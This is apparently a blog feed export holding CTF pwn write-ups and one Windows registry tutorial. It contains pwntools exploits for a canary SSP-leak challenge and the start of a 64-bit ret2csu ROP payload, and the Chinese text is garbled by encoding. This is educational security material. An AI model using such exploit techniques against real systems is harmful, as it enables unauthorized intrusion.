class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæƒ³åˆ°<code>SSP Leak</code>ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿè¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰<code>argv[0]</code>ï¼Œæˆ‘ä»¬å°±èƒ½è®©<code>Canary</code>ä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000040094E ; char s[]</span><br><span class="line">.rodata:000000000040094E s               db &apos;Thank you, bye!&apos;,0  ; DATA XREF: sub_4007E0:loc_400878â†‘o</span><br><span class="line">.rodata:000000000040095E                 align 20h</span><br></pre></td></tr></table></figure><p>å°è¯•è¾“å‡ºå­—ç¬¦ä¸²sï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">test = <span class="number">0x40094E</span></span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">p.sendline(p64(test) * <span class="number">200</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please overwrite the flag:'</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvall()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœæœç„¶æ³„æ¼å‡ºæ¥äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x4c bytes:</span><br><span class="line">    'Thank you, bye!\n'</span><br><span class="line">    '*** stack smashing detected ***: Thank you, bye! terminated\n'</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°å­˜æ”¾flagçš„åœ°å€ï¼Œåœ¨idaä¸Šæ‰¾åˆ°æ˜¯<code>0x600d21</code>ï¼Œä½†æ˜¯ç”±äºmainå‡½æ•°ä¸­æœ€åä¸€å¥è¯<code>memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));</code>ï¼Œåœ¨è°ƒç”¨<code>__stack_chk_fail()</code>çš„æ—¶å€™ï¼Œ<code>0x600d21</code>ä¸Šçš„å€¼æ—©å°±å·²ç»è¢«è¦†ç›–æˆå…¶å®ƒå€¼äº†ã€‚é€šè¿‡gdbè°ƒè¯•ï¼Œå‘ç°åœ¨å¦ä¸€ä¸ªåœ°å€ä¹Ÿæœ‰flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; find &apos;CTF&apos;</span><br><span class="line">Searching for &apos;CTF&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br><span class="line">smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ¶‰åŠåˆ°äº†elfæ–‡ä»¶çš„é‡æ˜ å°„ï¼Œå½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œæ–‡ä»¶çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; vmmap </span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00400000         0x00401000         r-xp/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes</span><br><span class="line">0x00600000         0x00601000         rw-p/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd7000 0x00007ffff7fda000 rw-pmapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">test = <span class="number">0x40094E</span></span><br><span class="line">flag = <span class="number">0x400d20</span></span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">p.sendline(p64(flag) * <span class="number">200</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please overwrite the flag:'</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvall()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>ç›´æ¥â€œæŒ–â€åˆ°canaryäº§ç”Ÿçš„æœ¬æºâ€”â€”AUXV(Auxiliary Vector)ï¼Œå¹¶ä¿®æ”¹è¯¥ç»“æ„ä½“ä»è€Œä½¿canaryå€¼å¯æ§ã€‚</p><h3 id="2017-TCTF-Final-upxof"><a href="#2017-TCTF-Final-upxof" class="headerlink" title="2017-TCTF-Final-upxof"></a>2017-TCTF-Final-upxof</h3><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/</a><br><a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a><br><a href="https://bbs.ichunqiu.com/thread-44069-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44069-1-1.html</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a><br><a href="https://deadc0de.re/articles/microwave-write-up.html" target="_blank" rel="noopener">https://deadc0de.re/articles/microwave-write-up.html</a><br><a href="https://braddaniels.org/csaw-quals-2017-scv/" target="_blank" rel="noopener">https://braddaniels.org/csaw-quals-2017-scv/</a><br><a href="https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/" target="_blank" rel="noopener">https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…¥é—¨canaryã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡</title>
    <link href="https://qianfei11.github.io/2019/02/15/%E4%B8%BAWindows%E7%B3%BB%E7%BB%9F%E9%BC%A0%E6%A0%87%E5%8F%B3%E9%94%AE%E6%B7%BB%E5%8A%A0%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%9B%BE%E6%A0%87/"/>
    <id>https://qianfei11.github.io/2019/02/15/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/</id>
    <published>2019-02-15T03:00:27.000Z</published>
    <updated>2019-02-15T03:32:47.877Z</updated>
    
    <content type="html"><![CDATA[<p>Windowsä¸‹ä¸æƒ³è¦æ€»æ˜¯å…ˆæ‰“å¼€è½¯ä»¶ï¼Œå†æŠŠæ–‡ä»¶æ‹–è¿›å»ã€‚é‚£å°±å¯ä»¥ä¿®æ”¹ä¸€ä¸‹å³é”®èœå•ã€‚</p><a id="more"></a><h1 id="ä¿®æ”¹æ–‡ä»¶å³é”®èœå•"><a href="#ä¿®æ”¹æ–‡ä»¶å³é”®èœå•" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶å³é”®èœå•"></a>ä¿®æ”¹æ–‡ä»¶å³é”®èœå•</h1><p>æŸ¥å£³è¿˜æœ‰è°ƒè¯•çš„æ—¶å€™æ€»æ˜¯æŠŠæ–‡ä»¶æ‹–æ¥æ‹–å»å®åœ¨å¤ªéº»çƒ¦äº†ï¼Œä¸å¦‚ä¿®æ”¹ä¸€ä¸‹ï¼Œç›´æ¥å³é”®å°±èƒ½å¼€å§‹åˆ†æã€‚ä¸‹é¢å°±è®°å½•ä¸€ä¸‹ä¿®æ”¹æ–‡ä»¶å³é”®èœå•çš„è¿‡ç¨‹ï¼š</p><p>é¦–å…ˆæ‰“å¼€æ³¨å†Œè¡¨ï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/1.png" alt="æ‰“å¼€æ³¨å†Œè¡¨"></p><p>ä¾æ¬¡è¿›å…¥<code>è®¡ç®—æœº\HKEY_CLASSES_ROOT\*\shell</code>ï¼Œåœ¨<code>shell</code>é¡¹ä¸‹æ–°å»ºä¸€ä¸ªé¡¹ï¼Œè¿™é‡Œä»¥PEIDä¸ºä¾‹ã€‚ç„¶ååœ¨æ–°å»ºå¥½çš„<code>PEID</code>é¡¹ä¸‹ï¼Œæ–°å»ºå­—ç¬¦ä¸²å€¼ï¼Œå‘½åä¸º<code>Icon</code>ï¼Œå¹¶å°†å…¶å€¼ä¿®æ”¹ä¸ºæºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼ˆ<code>$PATH_TO_EXE</code>ï¼‰ï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/2.png" alt="æ–°å»ºå­—ç¬¦ä¸²å€¼"></p><p>æœ€åå†åœ¨<code>PEID</code>é¡¹ä¸‹æ–°å»ºé¡¹<code>Command</code>ï¼Œä¿®æ”¹å…¶å€¼ä¸º<code>&quot;$PATH_TO_EXE&quot; &quot;%1&quot;</code>ï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/3.png" alt="æ–°å»ºCommandå¹¶ä¿®æ”¹å€¼"></p><p>æˆåŠŸåçœ‹ä¸€çœ‹æ•ˆæœï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/4.png" alt="æ•ˆæœ"></p><h1 id="ä¿®æ”¹ç©ºç™½å¤„å³é”®èœå•"><a href="#ä¿®æ”¹ç©ºç™½å¤„å³é”®èœå•" class="headerlink" title="ä¿®æ”¹ç©ºç™½å¤„å³é”®èœå•"></a>ä¿®æ”¹ç©ºç™½å¤„å³é”®èœå•</h1><p>åœ¨å½“å‰ç›®å½•ä¸‹æ‰“å¼€<code>cmd</code>çª—å£å¤ªéº»çƒ¦ï¼Œä¸å¦‚ä¹Ÿæ·»åŠ åˆ°å³é”®èœå•é‡Œï¼š</p><p>é¦–å…ˆåŒæ ·æ‰“å¼€æ³¨å†Œè¡¨ã€‚è¿›å…¥<code>è®¡ç®—æœº\HKEY_CLASSES_ROOT\Directory\Background\shell</code>ï¼Œæ–°å»ºé¡¹<code>åœ¨æ­¤è¿è¡ŒCMD</code>ï¼ŒåŒä»¥ä¸Šä¸€æ ·æ–°å»ºå­—ç¬¦ä¸²å€¼<code>Icon</code>ï¼Œå¹¶ä¿®æ”¹å€¼ï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/5.png" alt="æ·»åŠ å­—ç¬¦ä¸²å€¼"></p><p>åœ¨<code>åœ¨æ­¤è¿è¡ŒCMD</code>ä¸‹æ–°å»ºé¡¹<code>Command</code>ï¼Œä¿®æ”¹å€¼ä¸º<code>$PATH_TO_EXE</code>ï¼Œè¿™é‡Œä¸éœ€è¦åŒå¼•å·<code>&quot;</code>ï¼Œä¹Ÿä¸éœ€è¦<code>%1</code>ï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/6.png" alt="æ–°å»ºCommandå¹¶ä¿®æ”¹å€¼"></p><p>çœ‹çœ‹æ•ˆæœï¼š</p><p><img src="/pics/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/7.png" alt="æ•ˆæœ"></p><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://blog.csdn.net/p312011150/article/details/81207059" target="_blank" rel="noopener">https://blog.csdn.net/p312011150/article/details/81207059</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windowsä¸‹ä¸æƒ³è¦æ€»æ˜¯å…ˆæ‰“å¼€è½¯ä»¶ï¼Œå†æŠŠæ–‡ä»¶æ‹–è¿›å»ã€‚é‚£å°±å¯ä»¥ä¿®æ”¹ä¸€ä¸‹å³é”®èœå•ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="solution" scheme="https://qianfei11.github.io/tags/solution/"/>
    
  </entry>
  
  <entry>
    <title>ä¸­çº§ROP-ret2__libc_csu_init-writeup</title>
    <link href="https://qianfei11.github.io/2019/02/12/%E4%B8%AD%E7%BA%A7ROP-ret2-libc-csu-init-writeup/"/>
    <id>https://qianfei11.github.io/2019/02/12/ä¸­çº§ROP-ret2-libc-csu-init-writeup/</id>
    <published>2019-02-12T10:02:50.000Z</published>
    <updated>2019-02-14T01:40:26.013Z</updated>
    
    <content type="html"><![CDATA[<p>ç”¨è’¸ç±³çš„ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x64ç¯‡ä¸­çš„level5æ¥ç ”ç©¶ä¸€ä¸‹64ä½çš„ROPã€‚</p><a id="more"></a><p>64ä½çš„ç¨‹åºä¸­ï¼Œå‡½æ•°æ‰€è°ƒç”¨çš„å‚æ•°å¹¶ä¸æ˜¯å…¨éƒ¨åœ¨æ ˆä¸Šï¼Œå‰å…­ä¸ªå‚æ•°åˆ†åˆ«ä½äº<code>rdi</code>ã€<code>rsi</code>ã€<code>rdx</code>ã€<code>rcx</code>ã€<code>r8</code>å’Œ<code>r9</code>ï¼Œå…¶ä½™å‚æ•°åˆ™åœ¨æ ˆä¸Šã€‚åŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨çš„å†…å­˜åœ°å€ä¸èƒ½å¤§äº<code>0x00007fffffffffff</code>ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æ‰€ä»¥64ä½çš„ç¨‹åºéœ€è¦é€šè¿‡ropæˆ–è€…libcä¸­çš„å‡½æ•°æ¥è®¾ç½®å‚æ•°ã€‚</p><h1 id="åˆ†æç¨‹åº"><a href="#åˆ†æç¨‹åº" class="headerlink" title="åˆ†æç¨‹åº"></a>åˆ†æç¨‹åº</h1><p>ç¨‹åºç»™å‡ºçš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªå¼€äº†NXï¼Œé‚£ä¹ˆ<code>vulnerable_function()</code>ä¸­çš„æ ˆæº¢å‡ºæ˜¯å¾ˆæ˜¾ç„¶çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•å¯è¾…åŠ©çš„å‡½æ•°ï¼ŒåŒæ—¶ä¹Ÿæ‰¾ä¸åˆ°å¯ç”¨çš„gadgetsæ¥ç”¨ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°libcä¸­çš„ä¸€ä¸ªå‡½æ•°<code>__libc_csu_init()</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64â†“j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48â†‘j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨<code>loc_4005F0</code>ä¹‹åï¼Œæœ‰å¯¹ç¬¬ä¸‰ä¸ªå‚æ•°<code>rdx</code>ã€ç¬¬äºŒä¸ªå‚æ•°<code>rsi</code>ä»¥åŠç¬¬ä¸€ä¸ªå‚æ•°<code>rdi</code>çš„<code>mov</code>æ“ä½œã€‚åŒæ—¶å¦‚æœåˆç†è®¾ç½®<code>r12</code>å’Œ<code>rbx</code>çš„å¤§å°ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåšåˆ°<code>call</code>æŸä¸ªå‡½æ•°ã€‚å°¾å·´ä¸Šè¿˜æœ‰<code>mov</code>æ ˆä¸Šçš„å€¼åˆ°ä¸€äº›å¯„å­˜å™¨ä¸­ï¼Œä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°è¿™å’Œä¹‹å‰çš„å‚æ•°ä¹Ÿæœ‰ä¸€äº›è”ç³»ã€‚æ„é€ å‡ºä¸€ä¸ª<code>csu()</code>çš„å‡½æ•°ã€‚å› ä¸ºåœ¨ç¬¬äºŒæ¬¡è·³è½¬ä¸Šå»åï¼Œè¿˜æœ‰ä¸€æ¬¡<code>add rsp, 0x38</code>ï¼Œæ‰€ä»¥éœ€è¦åœ¨æ ˆä¸Šå†è¡¥56ä¸ªbyteï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  4005f0:       4c 89 fa                mov    rdx,r15</span></span><br><span class="line"><span class="comment">#  4005f3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4005f6:       44 89 ef                mov    edi,r13d</span></span><br><span class="line"><span class="comment">#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4005fd:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  400601:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  400604:       75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span></span><br><span class="line"><span class="comment">#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#  400624:       48 83 c4 38             add    rsp,0x38</span></span><br><span class="line"><span class="comment">#  400628:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">    <span class="comment"># function = r12</span></span><br><span class="line">    <span class="comment"># rdi = r13, rsi = r14, rdx = r15</span></span><br><span class="line">payload = flat([<span class="string">'\x00'</span> * <span class="number">136</span>, <span class="number">0x400606</span>, <span class="number">0</span>, rbx, rbp, r12, r13, r14, r15, <span class="number">0x4005f0</span>, <span class="string">'\x00'</span> * <span class="number">56</span>, ret_addr])</span><br><span class="line"><span class="comment"># print repr(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h1><p>ç„¶åæ¥ä¸‹æ¥çš„ä¸»è¦åˆ†ä¸ºä¸‰æ­¥ã€‚ç¬¬ä¸€æ­¥æ³„æ¼å‡º<code>write()</code>å‡½æ•°çš„åœ°å€ï¼Œä»¥è·å–libcï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 